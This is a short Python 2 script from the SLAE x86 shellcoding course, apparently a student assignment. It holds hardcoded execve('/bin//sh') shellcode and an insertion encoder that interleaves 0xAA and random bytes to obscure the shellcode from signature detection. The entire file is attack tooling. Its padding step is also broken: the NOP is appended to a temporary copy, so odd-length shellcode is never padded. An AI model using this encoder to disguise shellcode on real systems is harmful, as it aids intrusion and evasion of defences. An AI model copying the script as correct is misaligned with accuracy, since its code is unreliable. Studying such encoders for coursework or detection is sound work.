#SLAE x86 Assignment 4: Custom Encoder Script
#Author: 4p0cryph0n
#Website: https://4p0cryph0n.github.io

#!/usr/bin/python

import sys
import random

execve = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

#If length is an odd no. add a nop at the end to make even

if len(bytearray(execve)) % 2 != 0:
	bytearray(execve).append(0x90)

encoded2 = ""

#add 0xaa followed by a random byte after each byte of the shellcode

for x in bytearray(execve):

	encoded2 += '0x'
	encoded2 += '%02x,' % x
	encoded2 += '0x%02x,' % 0xAA + '0x%02x,' % random.randint(1,255)

print encoded2
